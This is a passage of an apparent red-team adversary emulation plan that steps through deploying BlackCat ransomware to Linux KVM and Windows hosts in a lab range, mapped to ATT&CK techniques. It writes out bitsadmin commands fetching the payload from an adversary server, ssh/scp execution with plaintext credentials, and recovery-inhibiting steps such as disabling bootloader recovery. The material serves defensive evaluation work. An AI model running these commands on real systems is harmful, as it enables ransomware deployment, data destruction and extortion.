  | ExMatter exfiltrates files to SFTP server | [UploadFile](../Resources/ExMatter/ExMatter/ExMatter.cs#L769) | T1048.002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol | [Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps) [Kroll](https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool)
  | ExMatter overwrites itself | [Destroy](../Resources/ExMatter/ExMatter/ExMatter.cs#L909) | T1485 Data Destruction | [Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration) [Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps)
  | ExMatter deletes itself | [Destroy](../Resources/ExMatter/ExMatter/ExMatter.cs#L909) | T1070.004 Indicator Removal: File Deletion | [Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration) [Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps)

</details>

<br>

## Step 5 - Payload Deployment

### :microphone: Voice Track
The BlackCat affliate downloads `BlackCat (Linux)` to the bastion host
`kimeramon (10.20.20.11)` and uses SCP to copy `BlackCat (Linux)` to the Linux
KVM server `leomon (10.20.10.16)`, providing the Linux KVM server
administrator credentials `marakawa` retrieved from `InfoStealer`.
Next, the BlackCat affiliate sends an SSH command to the Linux KVM server
to execute `BlackCat (Linux)` on the Linux KVM server.

`BlackCat (Linux)` will:
- Discover system UUID, current username, and current hostname
- Verify that the target machine is a KVM server
- Enumerate and stop running virtual machines
- Enumerate and delete virtual machine snapshots
- Terminate a pre-defined set of processes and services that may interfere with encryption
- Enumerate and encrypt virtual machine volumes using AES
  - Encrypted files are appended with `.skyfl2e` at the end the filename. Ex.
  "[original filename].[extension].skyfl2e"
  - Place a ransom note in folder(s) containing the encrypted VM volumes

### ☣️ Procedures

> :fast_forward: Emulate the following legitimate user activity:
>
> * :arrow_right: initiate an RDP session to the jumpbox `homelander (116.83.1.29)` (if not already open)
>
> * Open up powershell and SSH to the KVM server, typing `yes` to continue connecting as the KVM admin:
>   ```
>   ssh marakawa@10.20.10.16
>   ```
>   | Username | Password |
>   | -------- | -------- |
>   | marakawa | cuL9LmnrdnWqbqcA@ |
>
> * list all VMs regardless of running state
>   ```
>   sudo virsh list --all
>   ```
>
> * list current snapshots for each VM
>   ```
>   sudo virsh snapshot-list fedora2
>   sudo virsh snapshot-list test1
>   sudo virsh snapshot-list test2
>   ```
>
> * create additional snapshot for each VM
>   ```
>   sudo virsh snapshot-create-as fedora2 debugsnapshot --description "debug snapshot"
>   sudo virsh snapshot-create-as test1 debugsnapshot --description "debug snapshot"
>   sudo virsh snapshot-create-as test2 debugsnapshot --description "debug snapshot"
>   ```
>
> * enumerate snapshots again
>   ```
>   sudo virsh snapshot-list fedora2
>   sudo virsh snapshot-list test1
>   sudo virsh snapshot-list test2
>   ```
>
> * start VMs
>   ```
>   sudo virsh start fedora2
>   sudo virsh start test1
>   sudo virsh start test2
>   ```
>
> * check VM state again
>   ```
>   sudo virsh list
>   ```
>
> * terminate SSH session
>   ```
>   exit
>   ```
>
> :fast_forward: Resume red team activity:

* :arrow_right: switch back to your RDP session to the bastion host `kimeramon (10.20.20.11)`

* Open `cmd.exe` (or use an existing cmd.exe running as `zorimoto`) and execute `BITSAdmin.exe` to download
BlackCat (Linux) to the bastion host `kimeramon (10.20.20.11)` from the
adversary server
  ```
  bitsadmin /transfer defaultjob5 /download http://the-inator.com/digirevenge/digirevenge %TEMP%\digirevenge
  ```

* Open PowerShell (non-elevated) and SCP BlackCat to the Linux KVM server
`leomon (10.20.10.16)`, typing `yes` to continue connecting, providing the
Linux KVM server administrator credentials `marakawa` when prompted
  ```
  scp $Env:temp\digirevenge marakawa@10.20.10.16:/tmp/digirevenge
  ```
  
  | Password |
  | -------- |
  | cuL9LmnrdnWqbqcA@ |

* Using PowerShell, execute BlackCat via SSH command to the Linux KVM server,
providing the Linux KVM server administrator credentials when prompted
  ```
  ssh -t marakawa@10.20.10.16 "chmod +x /tmp/digirevenge && sudo /tmp/digirevenge --access-token 15742aa362a84ba3"
  ```

  | Password |
  | -------- |
  | cuL9LmnrdnWqbqcA@ |

#### Verifying BlackCat (Linux) Logs
* :arrow_right: Return to your Kali server and open up a terminal window

* Execute the following to copy the BlackCat Linux logs from the KVM server as `evals_domain_admin`, typing `yes` to continue the connection:
  ```
  cd
  scp evals_domain_admin@10.20.10.16:/home/marakawa/bc.log ~/kvm.log
  ```
  | Password |
  | -------- |
  | axi9eengei9inaeR@ |

* Execute the following in the kali terminal to decrypt and inspect the logs:
  ```
  python3 alphv_blackcat/Resources/log_decryptor/aes_base64_log_decryptor.py -i ~/kvm.log -o ~/dec_kvm.log --aes-128-ctr -k 4a99bcca87318b844be7928cd98e23f9;
  cat ~/dec_kvm.log
  ```
  * Ensure that the logs show evidence of successful encryption activity and VM tampering.

### :mag: Reference Code & Reporting
1. https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware
1. https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack
1. https://www.mandiant.com/resources/blog/alphv-ransomware-backup
1. https://unit42.paloaltonetworks.com/blackcat-ransomware/#Technical-Details
1. https://assets.sophos.com/X24WTUEQ/at/q6r6n3x43mnrfchn5tfh3qmw/sophos-x-ops-active-adversary-multiple-attackers-wp.pdf
1. https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/
1. https://cybersecurity.att.com/blogs/labs-research/blackcat-ransomware
1. https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/
1. https://www.varonis.com/blog/blackcat-ransomware
1. https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/'https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware
1. https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf

<details>
  <summary>:link: Click to expand source code links table</summary>

  > :information_source: **NOTE:** Not all techniques listed in this table
  directly map to evaluation substeps

  | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
  | ----------------- | ---------------- | ---------------- | ------------------- |
  | Open cmd | - | T1059.003 Command and Scripting Interpreter: Windows Command Shell | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Create BITSAdmin download job from adversary SMB share | - | T1197 BITS Jobs | [Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Download BlackCat (Linux) via BITSAdmin.exe | - | T1105 Ingress Tool Transfer | [Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Open PowerShell | - | T1059.001 Command and Scripting Interpreter: PowerShell | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Authenticate with Linux KVM server administrator account credentials | - | Valid Accounts: Domain Accounts | [Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/) |
  | Transfer BlackCat (Linux) to Linux server | - | T1570 Lateral Tool Transfer | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | Execute chmod to make BlackCat (Linux) executable | - | T1222 File and Directory Permissions Modification | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | Execute BlackCat (Linux) on Linux server | - | T1021.004 Remote Services: SSH | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Linux) enumerates VMs | [get_vms](../Resources/blackcat/src/kvm.rs#L178) | T1057 Process Discovery | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Linux) stops VMs | [shutdown_vm](../Resources/blackcat/src/kvm.rs#L360) | T1489 Service Stop | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) | 
  | BlackCat (Linux) enumerates snapshots | [get_vm_snapshots](../Resources/blackcat/src/kvm.rs#L268) | T1083 File and Directory Discovery | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) | 
  | BlackCat (Linux) deletes snapshots | [delete_snapshot](../Resources/blackcat/src/kvm.rs#L314) | T1490 Inhibit System Recovery | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) | 
  | BlackCat (Linux) terminates processes | [killall_by_name](../Resources/blackcat/src/proc.rs#L79) | T1489 Service Stop | [Microsoft](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB) |
  | BlackCat (Linux) terminates services | [terminate_services](../Resources/blackcat/src/service.rs#L239) | T1489 Service Stop | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) | 
  | BlackCat (Linux) enumerates VM volumes | [get_volume_paths](../Resources/blackcat/src/kvm.rs#L225) | T1083 File and Directory Discovery | [Microsoft](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB) |
  | BlackCat (Linux) encrypts VM volumes | [encrypt_volumes](../Resources/blackcat/src/kvm.rs#L31) | T1486 Data Encrypted for Impact | [Microsoft](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB) |
  | BlackCat (Linux) leaves ransom notes | [drop_ransom_note](../Resources/blackcat/src/encrypt.rs#L184) | T1491.001 Defacement: Internal Defacement | [Microsoft](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB) |

</details>

<br>

## Step 6 - Encryption for Impact/Inhibit System Discovery

### :microphone: Voice Track
The BlackCat affliate downloads `BlackCat (Windows)` to the bastion host
`kimeramon (10.20.20.11)` and provides the Domain Admin credentials
`ykaida.da` to run the executable with administrative privileges.

`BlackCat (Windows)` will:
- Delete volume shadow copies via API calls
- Disable bootloader recovery using `bcdedit /set {default} recoveryenabled No`
- Run command to collect Universally Unique Identifiers (UUIDs) via `WMIC.exe`
- Get current username and current hostname
- Enable remote-to-local and remote-to-remote symbolic link evaluation via `fsutil`
- Empty the recycling bin
- Modify the registry to increase the maximum limit of concurrent network
requests machines can make (for PsExec propagation and accessing remote files):
  - `reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f`
- Propagate via a PsExec module embedded in BlackCat code and compressed with
zlib
  - Performs NetBIOS scans on the local network to determine valid Windows hosts to propagate to
- Enumerate all local disk partitions and mount any hidden partitions for later 
encryption
- Terminate a pre-defined set of processes and services that may interfere with encryption
- Encrypt files using AES
  - `BlackCat` excludes some directories, filenames, and file extensions from
  encryption
  - Encrypted files are appended with `.skyfl2e` at the end the filename. Ex.
  "[original filename].[extension].skyfl2e"
  - `BlackCat` will drop ransom notes in directories containing encrypted files
- After encryption, `BlackCat` will:
  - Change wallpaper for logged-in users to image of ransom note
  - Unmount previously mounted partitions
  - Delete volume shadow copies again
  - List and clear Windows Event logs via API calls

### ☣️ Procedures

* Open `cmd.exe` (or use an existing cmd.exe running as `zorimoto`) and execute `BITSAdmin.exe` to download
BlackCat (Windows) to the bastion host `kimeramon (10.20.20.11)` from the
adversary server
  ```
  bitsadmin /transfer defaultjob6 /download http://the-inator.com/digirevenge/digirevenge.exe %TEMP%\digirevenge.exe
  ```

* Search for `cmd.exe` then right-click and Run As Administrator to open a new
Command Prompt, providing the Domain Admin B credentials `ykaida.da`
when prompted:

  | Username | Password |
  | -------- | -------- |
  | ykaida.da | FWy9aXyXbYrbxFcE! |

* Using the new `cmd.exe` with `ykaida.da` privileges, execute
BlackCat (Windows)
  ```
  C:\Users\zorimoto\AppData\Local\Temp\digirevenge.exe --access-token 15742aa362a84ba3
  ```

#### Verifying BlackCat (Windows) Logs
* :arrow_right: Return to your RDP session to the Windows jumpbox `homelander (116.83.1.29)`

* :arrow_right: From the Windows jumpbox, initiate an RDP session to `blacknoirmon (10.20.10.4)` Subsidiary B Domain Controller as `digirevenge\evals_domain_admin`:
  | Username | Password |
  | -------- | -------- |
  | digirevenge\evals_domain_admin | axi9eengei9inaeR@ |

* Open an admin PowerShell prompt and execute the following to fetch the BlackCat logs from affected Subsidiary B hosts, zip them up into a single archive, and SCP the archive to the Kali server:
  ```
  $path="C$\Windows\System32\clog.xtlog";
  $destDir="C:\Users\evals_domain_admin\sblogs";
  $zipPath="C:\Users\evals_domain_admin\sblogs.zip";
  mkdir "$destDir" -force | Out-Null;
  $hosts=@("10.20.10.4", "10.20.10.200", "10.20.10.23", "10.20.10.122", "10.20.20.11", "10.20.20.22", "10.20.20.33");
  foreach ($targhost in $hosts) {
      $logPath = "\\$targhost\$path"
      if (Test-Path "$logPath") {
          Write-Host "[INFO]  Fetching log file on $targhost";
          cp "$logPath" "$destDir\$targhost.log" -Force;
      } else {
          Write-Host "[ERROR] Failed to find log file on $targhost";
      }
  }
  Compress-Archive -Path "$destDir" -DestinationPath "$zipPath";
  scp "$zipPath" op1@176.59.1.18:/tmp/sblogs.zip;
  Remove-Item -Recurse -Force "$destDir";
  Remove-Item -Force "$zipPath";
  ```
  * If prompted, type `yes` to continue the connection for SCP

* :arrow_right: Switch to your kali server and open up a terminal window

* Execute the following in the kali terminal to decrypt and inspect the logs:
  ```
  cd 
  mv /tmp/sblogs.zip ./
  unzip sblogs.zip
  cd sblogs
  for filename in *.log; do
    python3 alphv_blackcat/Resources/log_decryptor/aes_base64_log_decryptor.py -i $filename -o dec_$filename --aes-128-ctr -k 4a99bcca87318b844be7928cd98e23f9;
  done
  ```
  * Look through each of the decrypted log files (starting with `dec_*`) and make sure all required activity was exected and that nothing was skipped or errored out.

### :mag: Reference Code & Reporting
1. https://www.varonis.com/blog/blackcat-ransomware
1. https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Blackcat&threatId=-2147158032

<details>
  <summary>:link: Click to expand source code links table</summary>

  > :information_source: **NOTE:** Not all techniques listed in this table
  directly map to evaluation substeps

  | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
  | ----------------- | ---------------- | ---------------- | ------------------- |
  | Open cmd | - | T1059.003 Command and Scripting Interpreter: Windows Command Shell | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Create BITSAdmin download job from adversary SMB share | - | T1197 BITS Jobs | [Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Download BlackCat (Windows) via BITSAdmin.exe | - | T1105 Ingress Tool Transfer | [Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Authenticate with Domain Admin account credentials | - | T1078.002 Valid Accounts: Domain Accounts | [Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/) |
  | BlackCat (Windows) deletes volume shadow copies | [delete_shadow_copies](../Resources/blackcat/src/recovery.rs#L95) | T1490 Inhibit System Recovery | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) modifies bootloader | [disable_bootloader_recovery](../Resources/blackcat/src/recovery.rs#L63) | T1490 Inhibit System Recovery | [Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/) |
  | BlackCat (Windows) collects host UUID | [get_uuid](../Resources/blackcat/src/discovery.rs#L219) | T1082 System Information Discovery | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) discovers current username | [get_username](../Resources/blackcat/src/discovery.rs#L116) | T1033 System Owner/User Discovery |  [Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/) |
  | BlackCat (Windows) discovers current hostname | [get_hostname](../Resources/blackcat/src/discovery.rs#L166) | T1082 System Information Discovery | [Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/) |
  | BlackCat (Windows) empties the recycling bin | [empty_recycling_bin](../Resources/blackcat/src/recycling.rs#L18) | T1485 Data Destruction | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) modifies the registry | [update_maxmpxct_settings](../Resources/blackcat/src/latmove/propagate.rs#L71) | T1112 Modify Registry | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) contains embedded PsExec | [setup_psexec](../Resources/blackcat/src/psexec.rs#L29) | T1027.009 Obfuscated Files or Information: Embedded Payloads | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | PsExec is compressed with zlib | [setup_psexec](../Resources/blackcat/src/psexec.rs#L29) | T1027 Obfuscated Files or Information | [Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware) |
  | BlackCat (Windows) performs NetBIOS scans | [find_local_targets](../Resources/blackcat/src/latmove/propagate.rs#L93) | T1018 Remote System Discovery | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) executes PsExec to propagate | [propagate_via_psexec](../Resources/blackcat/src/latmove/propagate.rs#L31) | T1570 Lateral Tool Transfer | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) is executed using PsExec | - | T1569.002 System Services: Service Execution | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) enumerates local disk partitions | [mount_hidden_partitions](../Resources/blackcat/src/enumerate.rs#L42) | T1082 System Information Discovery | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) mounts hidden partitions | [mount_hidden_partitions](../Resources/blackcat/src/enumerate.rs#L42) | T1083 File and Directory Discovery | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) terminates processes | [killall_by_name](../Resources/blackcat/src/proc.rs#L79) | T1489 Service Stop | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) terminates services | [terminate_services](../Resources/blackcat/src/service.rs#L239) | T1489 Service Stop | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) encrypts files using AES | [encrypt](../Resources/blackcat/src/encrypt.rs#L86) | T1486 Data Encrypted for Impact | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) leaves ransom notes | [drop_ransom_note](../Resources/blackcat/src/encrypt.rs#L184) | T1491.001 Defacement: Internal Defacement | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) changes the wallpaper | [set_wallpaper](../Resources/blackcat/src/wallpaper.rs#L22) | T1491.001 Defacement: Internal Defacement | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) deletes volume shadow copies again | [delete_shadow_copies](../Resources/blackcat/src/recovery.rs#L95) | T1490 Inhibit System Recovery | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
  | BlackCat (Windows) lists and clears logs | [clear_event_logs](../Resources/blackcat/src/eventdel.rs#L25) | T1070.001 Indicator Removal: Clear Windows Event Logs | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |

</details>

<br>
